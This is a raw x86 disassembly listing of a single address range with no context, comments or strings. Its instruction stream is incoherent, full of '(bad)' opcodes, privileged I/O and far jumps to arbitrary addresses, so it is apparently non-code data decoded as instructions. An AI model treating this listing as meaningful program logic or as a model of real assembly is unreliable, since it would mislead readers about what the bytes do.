  42c871:	loop   0x42c85d
  42c873:	cmp    eax,0x141e0753
  42c878:	add    al,0x5a
  42c87a:	jg     0x42c869
  42c87c:	mov    bh,0xed
  42c87e:	retf   
  42c87f:	xchg   edx,eax
  42c880:	outs   dx,BYTE PTR ds:[esi]
  42c881:	mov    ds:0xdee3448,al
  42c886:	inc    esi
  42c887:	inc    esi
  42c888:	dec    edi
  42c889:	mov    ds:0x8aaef24b,eax
  42c88e:	in     al,dx
  42c88f:	push   ecx
  42c890:	or     ch,BYTE PTR [ecx+0x554c60d2]
  42c896:	popf   
  42c897:	dec    ebp
  42c898:	(bad)  
  42c899:	sub    eax,0x680e6cb9
  42c89e:	xor    al,0xf
  42c8a0:	inc    esp
  42c8a1:	sbb    DWORD PTR [edx+0x2b8167c1],edi
  42c8a7:	pop    esi
  42c8a8:	sahf   
  42c8a9:	mov    ss,WORD PTR [ecx]
  42c8ab:	ficomp WORD PTR [ebx-0xf]
  42c8ae:	ja     0x42c85c
  42c8b0:	mov    edi,0x5573ca97
  42c8b5:	push   ss
  42c8b6:	mov    DWORD PTR [esi-0xc],edi
  42c8b9:	mov    ebp,0xbbe66a1b
  42c8be:	popa   
  42c8bf:	sbb    edx,ebx
  42c8c1:	leave  
  42c8c2:	sub    ah,BYTE PTR [edi-0x26]
  42c8c5:	ret    
  42c8c6:	mov    edx,ecx
  42c8c8:	and    ecx,eax
  42c8ca:	mov    al,ah
  42c8cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8cd:	mov    ebx,0xcb39ef37
  42c8d2:	inc    edi
  42c8d3:	call   0x3ab3ae91
  42c8d8:	test   eax,0x313c10ab
  42c8dd:	and    al,0x28
  42c8df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c8e0:	cmp    BYTE PTR [ebp+0x51],bl
  42c8e3:	mov    DWORD PTR [ebx-0x36],ebp
  42c8e6:	les    edx,FWORD PTR [ecx-0x2d]
  42c8e9:	call   0x81a5:0xd56839c3
  42c8f0:	aam    0x5f
  42c8f2:	repnz sbb ebp,DWORD PTR [eax-0x7]
  42c8f6:	mov    BYTE PTR [edx-0x16dd0a80],dl
  42c8fc:	ins    BYTE PTR es:[edi],dx
  42c8fd:	xor    al,0x67
  42c8ff:	outs   dx,BYTE PTR ds:[esi]
  42c900:	inc    ecx
  42c901:	mov    ss,eax
  42c903:	pop    eax
  42c904:	loop   0x42c935
  42c906:	popa   
  42c907:	dec    eax
  42c908:	and    DWORD PTR [esp+edi*2+0x55],eax
  42c90c:	(bad)  
  42c90d:	mov    BYTE PTR [ecx+0x38],dh
  42c910:	xor    cl,ah
  42c912:	idiv   BYTE PTR [edi-0xf]
  42c915:	in     eax,0x34
  42c917:	push   ebp
  42c918:	ss push ebx
  42c91a:	mov    dl,BYTE PTR [edx-0x2ddf6dfd]
  42c920:	jmp    0x5d9bd97a
  42c925:	test   al,0xe8
  42c927:	imul   ebp,DWORD PTR [ebp+0x41],0x53
  42c92b:	mov    bl,BYTE PTR [edi+0x0]
  42c92e:	sub    al,0x6a
  42c930:	pop    ss
  42c931:	pop    ds
  42c932:	mov    edx,0xb5f14218
  42c937:	inc    edx
  42c938:	xchg   esp,eax
  42c939:	test   eax,0x563a2622
  42c93e:	sbb    BYTE PTR [edx],cl
  42c940:	inc    esp
	...
  42c9b1:	add    BYTE PTR [eax],al
  42c9b3:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42c9b9:	neg    ebx
  42c9bb:	outs   dx,DWORD PTR ds:[esi]
  42c9bc:	mov    ch,0xda
  42c9be:	push   esi
  42c9bf:	and    bh,BYTE PTR [ebx+0x7b]
  42c9c2:	retf   
  42c9c3:	mov    BYTE PTR [ebp-0xafffe29],ch
  42c9c9:	add    BYTE PTR [eax],al
  42c9cb:	add    BYTE PTR [esi+0x0],al
  42c9ce:	sbb    eax,0xcc0855ff
  42c9d3:	push   ecx
  42c9d4:	or     ah,BYTE PTR [ecx]
  42c9d6:	sbb    DWORD PTR [edi-0x64],ebp
  42c9d9:	and    ecx,edi
  42c9db:	xchg   ebp,eax
  42c9dc:	or     dl,dh
  42c9de:	icebp  
  42c9df:	sub    eax,0x14303877
  42c9e4:	lods   al,BYTE PTR ds:[esi]
  42c9e5:	cli    
  42c9e6:	imul   esi,DWORD PTR [edi],0x33469513
  42c9ec:	push   esp
  42c9ed:	arpl   WORD PTR [ebx+0x24],sp
  42c9f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c9f1:	aad    0x4d
  42c9f3:	mov    ebp,0x72fa043d
  42c9f8:	mov    eax,0x95e5ad66
  42c9fd:	mov    dh,0x32
  42c9ff:	push   eax
  42ca00:	adc    ecx,edi
  42ca02:	retf   0xe29a
  42ca05:	jmp    0xc2aa4bee
  42ca0a:	add    BYTE PTR [edi],ah
  42ca0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca0d:	jl     0x42ca24
  42ca0f:	pop    edi
  42ca10:	add    ebp,ebp
  42ca12:	popf   
  42ca13:	das    
  42ca14:	cmp    al,0x97
  42ca16:	or     DWORD PTR [ebp-0x4a3aa18e],ebx
  42ca1c:	je     0x42ca6a
  42ca1e:	lds    edi,FWORD PTR [ebp-0x2ace4757]
  42ca24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca25:	mov    ebx,0x503e23e4
  42ca2a:	loope  0x42ca75
  42ca2c:	in     al,0xad
  42ca2e:	sub    edi,ebx
  42ca30:	jno    0x42ca96
  42ca32:	dec    edi
  42ca33:	xlat   BYTE PTR ds:[ebx]
  42ca34:	jle    0x42c9e8
  42ca36:	xchg   DWORD PTR [edi+esi*1-0x2d67a30e],ecx
  42ca3d:	pop    edi
  42ca3e:	aad    0x10
  42ca40:	add    BYTE PTR [ebx-0x565c2c0e],ch
  42ca46:	mov    eax,0x4b4be760
  42ca4b:	dec    ebx
  42ca4c:	mov    ch,dl
  42ca4e:	xchg   ebx,eax
  42ca4f:	stc    
  42ca50:	jne    0x42caa2
  42ca52:	and    dh,bl
  42ca54:	cs cmp al,0xe4
  42ca57:	xchg   edi,eax
  42ca58:	and    edi,DWORD PTR [ebp-0x64d2453e]
  42ca5e:	cmp    ebp,0xacfe488a
  42ca64:	daa    
  42ca65:	xchg   edi,eax
  42ca66:	and    ch,BYTE PTR [edx]
  42ca68:	dec    esp
  42ca69:	mov    BYTE PTR [eax],dl
  42ca6b:	inc    edi
  42ca6c:	dec    eax
  42ca6d:	dec    ecx
  42ca6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca6f:	jns    0x42cae5
  42ca71:	dec    ebx
  42ca72:	lock xchg edi,eax
  42ca74:	jmp    0x7d78:0x37594d46
  42ca7b:	xchg   edx,eax
  42ca7c:	jp     0x42cac5
  42ca7e:	sub    eax,0x4f29eddc
  42ca83:	jns    0x42ca36
  42ca85:	xlat   BYTE PTR ds:[ebx]
  42ca86:	imul   esp,DWORD PTR [ebx-0x5f53e4e0],0xffffffc9
  42ca8d:	or     eax,0x70c7c3e
  42ca92:	lock je 0x42cb03
  42ca95:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42ca97:	aaa    
  42ca98:	jmp    0xbf2c2818
  42ca9d:	mov    ebx,0x46da0154
  42caa2:	int    0xb7
  42caa4:	scas   eax,DWORD PTR es:[edi]
  42caa5:	retf   0x892b
  42caa8:	xor    dl,BYTE PTR [ecx]
  42caaa:	lock push edx
  42caac:	rcr    DWORD PTR [ebp+edi*4-0x6d],1
  42cab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cab1:	jnp    0x42ca9a
  42cab3:	and    al,0xbd
  42cab5:	rcr    BYTE PTR [edi+0x3c],0x12
  42cab9:	pop    eax
  42caba:	stos   DWORD PTR es:[edi],eax
  42cabb:	adc    BYTE PTR [edx-0x6396bb16],bh
	...
  42cb31:	add    BYTE PTR [eax],al
  42cb33:	add    BYTE PTR [eax+ebp*1],dh
  42cb36:	add    DWORD PTR [esi],eax
  42cb38:	sbb    eax,0x6e3a372f
  42cb3d:	(bad)  
  42cb3e:	sbb    al,al
  42cb40:	or     bh,BYTE PTR [ecx-0x275d7b8b]
  42cb46:	add    DWORD PTR [eax],eax
  42cb48:	cmc    
  42cb49:	add    BYTE PTR [eax],al
  42cb4b:	add    BYTE PTR [edi+0x7f7337b5],ch
  42cb51:	out    dx,al
  42cb52:	jg     0x42cb85
  42cb54:	inc    edx
  42cb55:	or     BYTE PTR [eax-0x38e0a1ad],dh
  42cb5b:	dec    esi
  42cb5c:	inc    edx
  42cb5d:	inc    ebp
  42cb5e:	je     0x42cbdf
  42cb60:	inc    ebp
  42cb61:	xor    eax,0x154e2a4
  42cb66:	js     0x42cbcb
  42cb68:	push   cs
  42cb69:	cmp    BYTE PTR [edi+0x77],dh
  42cb6c:	mov    edx,0xbe438ce2
  42cb71:	adc    dl,BYTE PTR [edi-0x45d58892]
  42cb77:	scas   eax,DWORD PTR es:[edi]
  42cb78:	jle    0x42cbe8
  42cb7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb7b:	les    ecx,FWORD PTR [esi-0x11704edc]
  42cb81:	sbb    DWORD PTR [edx-0x261d3f17],0xd6c81c1e
  42cb8b:	jmp    0x42cbdb
  42cb8d:	lods   al,BYTE PTR ds:[esi]
  42cb8e:	or     BYTE PTR [ebx],0x56
  42cb91:	dec    ebx
  42cb92:	xchg   esi,eax
  42cb93:	les    ecx,FWORD PTR [edi-0x6928a40d]
  42cb99:	in     al,0xf5
  42cb9b:	xlat   BYTE PTR ds:[ebx]
  42cb9c:	int    0x75
  42cb9e:	mov    al,ds:0x57150aed
  42cba3:	test   al,0x63
  42cba5:	inc    esi
  42cba6:	call   0xc1b01fb2
  42cbab:	jnp    0x42cbd6
  42cbad:	push   edi
  42cbae:	jnp    0x42cbe7
  42cbb0:	mov    ecx,0x3bf09523
  42cbb5:	mov    esp,0x884f62d4
  42cbba:	pop    ecx
  42cbbb:	retf   0xe97b
  42cbbe:	and    ebx,DWORD PTR [edi-0x377fa014]
  42cbc4:	jnp    0x42cc42
  42cbc6:	dec    esi
  42cbc7:	clc    
  42cbc8:	test   dh,bh
  42cbca:	mov    cl,0xf8
  42cbcc:	xchg   esp,edi
  42cbce:	cmp    eax,0xb1771c14
  42cbd3:	fs ret 0xdb6b
  42cbd7:	lods   al,BYTE PTR ds:[esi]
  42cbd8:	out    0x22,al
  42cbda:	mov    bh,0x49
  42cbdc:	(bad)  
  42cbdd:	dec    ebp
  42cbde:	(bad)  
  42cbdf:	into   
  42cbe0:	dec    eax
  42cbe1:	pop    edi
  42cbe2:	icebp  
  42cbe3:	dec    ecx
  42cbe4:	or     al,0x2a
  42cbe6:	imul   edx,ebp,0x37b98342
  42cbec:	mov    ch,0x23
  42cbee:	je     0x42cbb4
  42cbf0:	mov    ebx,0x896e364e
  42cbf5:	cld    
  42cbf6:	and    esp,edx
  42cbf8:	jmp    0x42cbfa
  42cbfa:	push   ss
  42cbfb:	clc    
  42cbfc:	xor    BYTE PTR [esi+0x78],dh
  42cbff:	jge    0x42cc33
  42cc01:	shufps xmm0,XMMWORD PTR [edi+0x5c],0xcf
  42cc06:	mov    ds:0x3af6a6a1,al
  42cc0b:	lea    esi,[eax+0x3d938030]
  42cc11:	xchg   ebp,eax
  42cc12:	je     0x42cc73
  42cc14:	call   0x1925:0xbea92692
  42cc1b:	add    eax,0x4378704f
  42cc20:	shl    ecx,1
  42cc22:	out    0x5e,al
  42cc24:	(bad)  
  42cc25:	in     al,0xef
  42cc27:	jae    0x42cbde
  42cc29:	mov    al,0xca
  42cc2b:	cmp    BYTE PTR [esp+eiz*4-0x627aa4ff],dh
  42cc32:	je     0x42cc1a
  42cc34:	or     DWORD PTR [ebx],edi
  42cc36:	(bad)
  42cc39:	mov    ds:0x1b16087f,al
  42cc3e:	jmp    0x42cc42
  42cc40:	test   BYTE PTR [eax],al
	...
  42ccb2:	add    BYTE PTR [eax],al
  42ccb4:	mov    al,0xb6
  42ccb6:	pushf  
  42ccb7:	adc    al,0x9e
  42ccb9:	ds mov eax,0xcad7b5b6
  42ccbf:	sub    edi,ebp
  42ccc1:	push   0xffffff95
  42ccc3:	iret   
  42ccc4:	xchg   edi,eax
  42ccc5:	fld    DWORD PTR [ecx]
  42ccc7:	add    ch,dh
  42ccc9:	add    BYTE PTR [eax],al
  42cccb:	add    BYTE PTR [esi],dl
  42cccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ccce:	or     bl,BYTE PTR [esi+0x4c]
  42ccd1:	sbb    DWORD PTR [esi+0xa],eax
  42ccd4:	imul   esi,ebp,0x35d1b6c7
  42ccda:	cli    
  42ccdb:	mov    BYTE PTR [eax+esi*4],0xff
  42ccdf:	rcr    DWORD PTR [esp+edi*2+0x73b8015b],0x5a
  42cce7:	fwait
  42cce8:	jge    0x42ccab
  42ccea:	test   BYTE PTR [edx+0xf3ba707],bh
  42ccf0:	shl    BYTE PTR [eax],1
  42ccf2:	adc    eax,0x5913dbaa
  42ccf7:	jo     0x42ccb4
  42ccf9:	loopne 0x42cc8a
  42ccfb:	loope  0x42cd6e
  42ccfd:	pusha  
  42ccfe:	lods   eax,DWORD PTR ds:[si]
  42cd01:	pop    esi
  42cd02:	retf   0xceec
  42cd05:	xchg   esi,eax
  42cd06:	pushf  
  42cd07:	dec    ebp
  42cd08:	add    dl,cl
  42cd0a:	jbe    0x42cd32
  42cd0c:	adc    cl,BYTE PTR [ecx+0x327ad6d5]
  42cd12:	xchg   DWORD PTR [edi-0x53fd9cf9],ecx
  42cd18:	and    BYTE PTR [eax-0x1f],0x12
  42cd1c:	sub    BYTE PTR [edi-0x74],dh
  42cd1f:	xchg   ecx,eax
  42cd20:	icebp  
  42cd21:	push   ecx
  42cd22:	push   eax
  42cd24:	push   cs
  42cd25:	push   esp
  42cd26:	adc    cl,BYTE PTR [eax+0x1a]
  42cd29:	push   bp
  42cd2b:	fiadd  WORD PTR [ebx]
  42cd2d:	or     esp,ebx
  42cd2f:	lea    ebp,[esi]
  42cd31:	mov    ch,0xb8
  42cd33:	or     al,0x7a
  42cd35:	inc    ebx
  42cd36:	and    DWORD PTR [edx+0x518e0903],ecx
  42cd3c:	mov    eax,0xbf3820ab
  42cd41:	cmp    al,bl
  42cd43:	jns    0x42cdc0
  42cd45:	repz and esi,0xaceb0489
  42cd4c:	lods   eax,DWORD PTR ds:[esi]
  42cd4d:	xchg   edi,eax
  42cd4e:	nop
  42cd4f:	rol    BYTE PTR [ebp+0x4837a164],1
  42cd55:	ja     0x42cdb5
  42cd57:	xor    cl,BYTE PTR [edi+ebp*2+0x35]
  42cd5b:	dec    eax
  42cd5c:	xchg   ebp,eax
  42cd5d:	mov    DWORD PTR [ecx],eax
  42cd5f:	(bad)  
  42cd61:	mov    BYTE PTR [ecx-0x40d951d0],bh
  42cd67:	cld    
  42cd68:	mov    esp,0x4d16288a
  42cd6d:	push   ss
  42cd6e:	cmc    
  42cd6f:	or     eax,0x468bd670
  42cd74:	lock clc 
  42cd76:	pop    ebx
  42cd77:	mov    eax,0xe0f3a031
  42cd7c:	cmp    al,0xc4
  42cd7e:	adc    al,BYTE PTR [ebx-0x775b728a]
  42cd84:	adc    eax,0x3e6d41e4
  42cd89:	add    al,0xa
  42cd8b:	or     ebp,DWORD PTR [edi]
  42cd8d:	pop    es
  42cd8e:	nop
  42cd8f:	sub    DWORD PTR [ecx],esp
  42cd91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd92:	cmc    
  42cd93:	cmp    BYTE PTR [edx+eax*2],dl
  42cd96:	sbb    ebx,DWORD PTR [ebx-0x6d36cfee]
  42cd9c:	jecxz  0x42cd56
  42cd9e:	push   ebx
  42cd9f:	pop    edi
  42cda0:	call   0x15ae4a6e
  42cda5:	xor    BYTE PTR [ebp-0x15],dl
  42cda8:	pop    edi
  42cda9:	fdiv   DWORD PTR [ebx-0x17]
  42cdac:	repz push DWORD PTR [ebx-0x3e57db98]
  42cdb3:	cs push esi
  42cdb5:	iret   
  42cdb6:	xchg   edi,eax
  42cdb7:	nop
  42cdb8:	in     al,dx
  42cdb9:	cmp    edx,DWORD PTR [ebp-0x3f]
  42cdbc:	and    ah,BYTE PTR [eax-0x46]
  42cdbf:	inc    DWORD PTR [ebp+0x0]
	...
  42ce32:	add    BYTE PTR [eax],al
  42ce34:	xchg   edi,eax
  42ce35:	and    BYTE PTR [edi-0x26],al
  42ce38:	idiv   edi
  42ce3a:	lahf   
  42ce3b:	ins    DWORD PTR es:[edi],dx
  42ce3c:	mov    edx,0xa819410a
  42ce41:	jle    0x42ce6e
  42ce43:	dec    ebx
  42ce44:	mov    edx,ds
  42ce46:	add    DWORD PTR [eax],eax
  42ce48:	cmc    
  42ce49:	add    BYTE PTR [eax],al
  42ce4b:	add    BYTE PTR [eax],dl
  42ce4d:	aaa    
  42ce4e:	fwait
  42ce4f:	imul   eax,eax,0xeb34818e
  42ce55:	mov    al,0x92
  42ce57:	inc    ecx
  42ce58:	add    al,bh
  42ce5a:	iret   
  42ce5b:	inc    edx
  42ce5c:	jae    0x42ce4e
  42ce5e:	or     BYTE PTR [edx+0x44],0x23
  42ce62:	push   ds
  42ce63:	xor    DWORD PTR [ecx+0x680b8c0b],0x58506ab7
  42ce6d:	(bad)  
  42ce6e:	push   ebp
  42ce6f:	jnp    0x42ce97
  42ce71:	or     BYTE PTR [ebx],bh
  42ce73:	popa   
  42ce74:	test   ecx,esp
  42ce76:	lods   al,BYTE PTR ds:[esi]
  42ce77:	(bad)  
  42ce78:	xchg   ebx,eax
  42ce79:	fnstsw WORD PTR [edi+0x398cf4cd]
  42ce7f:	xchg   esp,eax
  42ce80:	fwait
  42ce81:	dec    ebx
  42ce82:	neg    DWORD PTR [esp+eiz*4]
  42ce85:	adc    ch,BYTE PTR [edx+0x12]
  42ce88:	iret   
  42ce89:	out    0xf0,al
  42ce8b:	or     BYTE PTR [esi+eiz*1+0x2],0xaf
  42ce90:	retf   
  42ce91:	loopne 0x42ce44
  42ce93:	or     DWORD PTR [eax],edx
  42ce95:	mov    bl,0x88
  42ce97:	push   ds
  42ce98:	push   cs
  42ce99:	inc    ecx
  42ce9a:	dec    eax
  42ce9b:	daa    
  42ce9c:	add    ecx,ebp
  42ce9e:	add    ecx,0x93c98a26
  42cea4:	cs sbb eax,0x89eaba79
  42ceaa:	push   ebx
  42ceab:	aaa    
  42ceac:	in     al,dx
  42cead:	mov    dl,0x95
  42ceaf:	jns    0x42ce7d
  42ceb1:	and    BYTE PTR [edx-0x38],ah
  42ceb4:	dec    DWORD PTR [ecx+ecx*4+0x7]
  42ceb8:	dec    edx
  42ceb9:	dec    ecx
  42ceba:	push   ds
  42cebb:	enter  0x35fd,0xfb
  42cebf:	mov    cl,0xea
  42cec1:	push   cs
  42cec2:	xchg   esi,eax
  42cec3:	lods   eax,DWORD PTR ds:[esi]
  42cec4:	add    cl,dl
  42cec6:	pop    ebp
  42cec7:	sbb    dh,bl
  42cec9:	cmp    eax,0xc1ba2419
  42cece:	fcos   
  42ced0:	pop    ebx
  42ced1:	mov    ah,BYTE PTR [ebx-0x23]
  42ced4:	push   ss
  42ced5:	(bad)  
  42ced6:	test   al,0x7c
  42ced8:	shr    BYTE PTR [ebx+0x735d6962],0xa6
  42cedf:	es sti 
  42cee1:	jp     0x42ce7f
  42cee3:	(bad)  [ecx+0x157aaed5]
  42cee9:	sbb    DWORD PTR [ebp-0x7d],eax
  42ceec:	adc    esp,DWORD PTR [ecx+0x31]
  42ceef:	loope  0x42cf42
  42cef1:	mov    ah,0x6c
  42cef3:	ss dec ebx
  42cef5:	aaa    
  42cef6:	mov    edi,0x20a57ed6
  42cefb:	push   edx
  42cefc:	ss mov esp,0xc609023d
  42cf02:	dec    eax
  42cf03:	(bad)  [esi-0x6dfd9856]
  42cf09:	mov    DWORD PTR [ebp+esi*1-0x51],eax
  42cf0d:	add    DWORD PTR [ebx+0x1a],ecx
  42cf10:	push   ss
  42cf11:	jnp    0x42cf8c
  42cf13:	out    dx,al
  42cf14:	int3   
  42cf15:	xchg   ebp,eax
  42cf16:	xchg   esi,eax
  42cf17:	fisttp DWORD PTR [esi+0xa]
  42cf1a:	nop
  42cf1b:	mov    al,ds:0xfd600dde
  42cf20:	gs aam 0xf2
  42cf23:	(bad)  
  42cf24:	mov    BYTE PTR [edi+0x10787a27],dh
  42cf2a:	faddp  st(5),st
  42cf2c:	pop    ds
  42cf2d:	test   al,0xf
  42cf2f:	cmp    cl,BYTE PTR [edi-0x7e]
  42cf32:	jo     0x42cf8a
  42cf34:	or     al,bh
  42cf36:	outs   dx,BYTE PTR ds:[esi]
  42cf37:	push   eax
  42cf38:	mov    dh,0x8a
  42cf3a:	mov    DWORD PTR [esi+0x4100ef0a],0x80
	...
  42cfb4:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42cfba:	jg     0x42cf56
  42cfbc:	loope  0x42cfcc
  42cfbe:	cs mov al,0x81
  42cfc1:	rcr    esi,1
  42cfc3:	pop    DWORD PTR [ecx-0xafffe25]
  42cfc9:	add    BYTE PTR [eax],al
  42cfcb:	add    BYTE PTR [ebx+eiz*2],dh
  42cfce:	jmp    0x42cfc5
  42cfd0:	(bad)  
  42cfd1:	pop    esp
  42cfd2:	fwait
  42cfd3:	hlt    
  42cfd4:	inc    ebx
  42cfd5:	inc    edx
  42cfd6:	rol    BYTE PTR [ebx-0x2e],0xcc
  42cfda:	inc    ecx
  42cfdb:	push   eax
  42cfdc:	mov    cl,0x68
  42cfde:	xor    eax,0x259d28a9
  42cfe3:	fisttp WORD PTR es:[ebx]
  42cfe6:	sahf   
  42cfe7:	pop    ebx
  42cfe8:	ret    0x9966
  42cfeb:	or     DWORD PTR [edx-0xf39cf17],0x63aa3c2b
  42cff5:	pop    edx
  42cff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cff7:	mul    DWORD PTR [edi]
  42cff9:	aam    0xcf
  42cffb:	pop    edx
  42cffc:	xchg   edi,eax
  42cffd:	cld    
  42cffe:	or     DWORD PTR [ecx],esi
  42d000:	daa    
  42d001:	jns    0x42d001
  42d003:	in     eax,dx
  42d004:	mov    dl,0xbd
  42d006:	xchg   ecx,eax
  42d007:	or     bh,BYTE PTR [ebx]
  42d009:	das    
  42d00a:	and    esi,eax
  42d00c:	mov    al,ds:0x599d1023
  42d011:	stos   BYTE PTR es:[edi],al
  42d012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d013:	sbb    BYTE PTR [edi-0x7a2f33b7],bl
  42d019:	fbld   TBYTE PTR [ebp-0x1f8850b8]
  42d01f:	pop    ss
  42d020:	inc    esp
  42d021:	nop
  42d022:	daa    
  42d023:	sub    BYTE PTR ds:0x11aa7167,bh
  42d029:	sub    DWORD PTR [eax],edi
  42d02b:	cmp    eax,ebx
  42d02d:	jae    0x42d076
  42d02f:	add    ecx,DWORD PTR ds:0x958b93a6
  42d035:	lock mov eax,0x3a6a961d
  42d03b:	mov    ebp,0x41d2cf91
  42d040:	call   0x8e35:0x8dc71eef
  42d047:	inc    esi
  42d048:	pop    ss
  42d049:	xchg   esp,eax
  42d04a:	mov    ecx,DWORD PTR [ebp+0x65]
  42d04d:	mov    al,ds:0x6c72763
  42d052:	test   al,0xbe
  42d054:	xchg   edx,eax
  42d055:	inc    ecx
  42d056:	shr    DWORD PTR [edi],cl
  42d058:	in     eax,dx
  42d059:	xor    al,0xd2
  42d05b:	sbb    eax,0x2d7ae6e1
  42d060:	popf   
  42d061:	xchg   ebp,eax
  42d062:	cwde   
  42d063:	mov    eax,0x9e4825ee
  42d068:	lahf   
  42d069:	xchg   esp,eax
  42d06a:	outs   dx,DWORD PTR ds:[esi]
  42d06b:	inc    ecx
  42d06c:	aad    0x3
  42d06e:	nop
  42d06f:	dec    ebx
  42d070:	add    eax,0x1d79e6be
  42d075:	jmp    DWORD PTR [edx-0x73]
  42d078:	sbb    bh,0x4c
  42d07b:	(bad)  
  42d07c:	dec    edx
  42d07d:	cdq    
  42d07e:	or     al,BYTE PTR [ebx-0x3f56bf14]
  42d084:	test   al,0xb0
  42d086:	fwait
  42d087:	adc    al,0xf9
  42d089:	in     eax,0xec
  42d08b:	shr    edi,0xda
  42d08e:	pop    ss
  42d08f:	jecxz  0x42d0d1
  42d091:	adc    ch,ch
  42d093:	jno    0x42d111
  42d095:	adc    BYTE PTR [edx-0x438b548c],dl
  42d09b:	jbe    0x42d075
  42d09d:	aaa    
  42d09e:	cli    
  42d09f:	in     eax,0xd2
  42d0a1:	sbb    BYTE PTR [ecx+edi*4-0x67],ch
  42d0a5:	pusha  
  42d0a6:	adc    dh,BYTE PTR [ebx+0x79eb0ee0]
  42d0ac:	fdivrp st(6),st
  42d0ae:	dec    ebp
  42d0af:	mov    ch,0xc8
  42d0b1:	mov    edi,0xbdacb65f
  42d0b6:	loope  0x42d0da
  42d0b8:	fcmovne st,st(2)
  42d0ba:	cmp    bh,BYTE PTR [ecx]
  42d0bc:	aad    0x8a
  42d0be:	lods   eax,DWORD PTR ds:[esi]
  42d0bf:	imul   edi,esp,0x0
	...
  42d132:	add    BYTE PTR [eax],al
  42d134:	imul   eax,DWORD PTR [edx-0x10105133],0x9941c76b
  42d13e:	xor    eax,0x92c4c250
  42d143:	dec    ecx
  42d144:	jbe    0x42d122
  42d146:	add    DWORD PTR [eax],eax
  42d148:	cmc    
  42d149:	add    BYTE PTR [eax],al
  42d14b:	add    BYTE PTR [edx],cl
  42d14d:	(bad)  
  42d14e:	aam    0x5e
  42d150:	pop    ebx
  42d151:	and    al,0x5c
  42d153:	pop    edi
  42d154:	retf   0x4acc
  42d157:	(bad)  
  42d158:	cmp    cl,dl
  42d15a:	mov    edi,0x9eb4ffad
  42d15f:	adc    eax,0xd4806ad2
  42d164:	cdq    
  42d165:	mov    eax,ds:0x4d0502ae
  42d16a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d16b:	ins    DWORD PTR es:[edi],dx
  42d16c:	sahf   
  42d16d:	cs mov esp,0x4072a97f
  42d173:	sbb    BYTE PTR [eax-0x4b93d840],0xc0
  42d17a:	aam    0xd5
  42d17c:	(bad)  
  42d17d:	loopne 0x42d12d
  42d17f:	(bad)  
  42d180:	lods   al,BYTE PTR ds:[esi]
  42d181:	fisttp QWORD PTR [ecx]
  42d183:	add    BYTE PTR ds:0x8648b3e2,bh
  42d189:	and    esi,DWORD PTR [edx+0x42672786]
  42d18f:	cdq    
  42d190:	test   DWORD PTR [edx-0x4534e80c],esi
  42d196:	or     DWORD PTR [esi+0x4],ebx
  42d199:	sbb    DWORD PTR ds:[ecx+0x6901fe19],esp
  42d1a0:	out    dx,eax
  42d1a1:	aas    
  42d1a2:	pop    es
  42d1a3:	mov    edx,0x2ea87986
  42d1a8:	xchg   esi,eax
  42d1a9:	scas   al,BYTE PTR es:[edi]
  42d1aa:	xchg   BYTE PTR [ebp+edx*1-0x3016c173],ch
  42d1b1:	cmp    al,0x56
  42d1b3:	loopne 0x42d180
  42d1b5:	or     BYTE PTR [ecx],0xa
  42d1b8:	sub    al,0x13
  42d1ba:	enter  0x9364,0xe7
  42d1be:	jbe    0x42d23e
  42d1c0:	bound  ecx,QWORD PTR [eax+ebx*1]
  42d1c3:	mov    ss,WORD PTR [ebx]
  42d1c5:	(bad)  
  42d1c7:	das    
  42d1c8:	rcr    DWORD PTR [ebx-0x14],1
  42d1cb:	loope  0x42d172
  42d1cd:	pop    ebx
  42d1ce:	push   0xffffffe3
  42d1d0:	ins    DWORD PTR es:[edi],dx
  42d1d1:	clc    
  42d1d2:	xor    BYTE PTR [ecx+0x43d16df0],0x91
  42d1d9:	pop    es
  42d1da:	fs (bad) 
  42d1dc:	das    
  42d1dd:	jnp    0x42d1a4
  42d1df:	sahf   
  42d1e0:	sbb    BYTE PTR [edi+0x6e53f631],0xde
  42d1e7:	dec    edi
  42d1e8:	sub    dh,BYTE PTR [edx-0x5ffed6dd]
  42d1ee:	adc    eax,0xb41520c6
  42d1f3:	inc    ebx
  42d1f4:	cld    
  42d1f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d1f6:	lds    ebx,FWORD PTR [edx-0x39e2cba4]
  42d1fc:	int    0x22
  42d1fe:	nop
  42d1ff:	xor    ebp,eax
  42d201:	test   BYTE PTR [edi+0x73],ah
  42d204:	mov    edx,0x495bb7e3
  42d209:	push   edx
  42d20a:	adc    edi,ebp
  42d20c:	inc    edi
  42d20d:	lea    ebx,ds:0x189d078e
  42d213:	sbb    eax,0x71e076d4
  42d218:	mov    ds:0x31603d9b,eax
  42d21d:	mov    bh,0xd4
  42d21f:	and    eax,0x7c681626
  42d224:	mov    cl,0x9b
  42d226:	repz push 0xffffff95
  42d229:	pop    es
  42d22a:	jecxz  0x42d1d8
  42d22c:	cmp    bh,BYTE PTR [edx]
  42d22e:	adc    eax,0x8787d4ae
  42d233:	cs push cs
  42d235:	mov    ds:0xafa7103d,eax
  42d23a:	xor    al,0xc0
  42d23c:	loop   0x42d262
  42d23e:	in     al,dx
  42d23f:	in     eax,0x18
	...
  42d2b1:	add    BYTE PTR [eax],al
  42d2b3:	add    dh,ah
  42d2b5:	psubusw mm5,QWORD PTR [ebp-0x7]
  42d2b9:	push   esi
  42d2bb:	(bad)  
  42d2bc:	xchg   ebp,eax
  42d2bd:	fsubr  DWORD PTR [esi-0x16]
  42d2c0:	dec    eax
  42d2c1:	daa    
  42d2c2:	inc    edi
  42d2c3:	mov    bh,0x6b
  42d2c5:	fld    QWORD PTR [ecx]
  42d2c7:	add    ch,dh
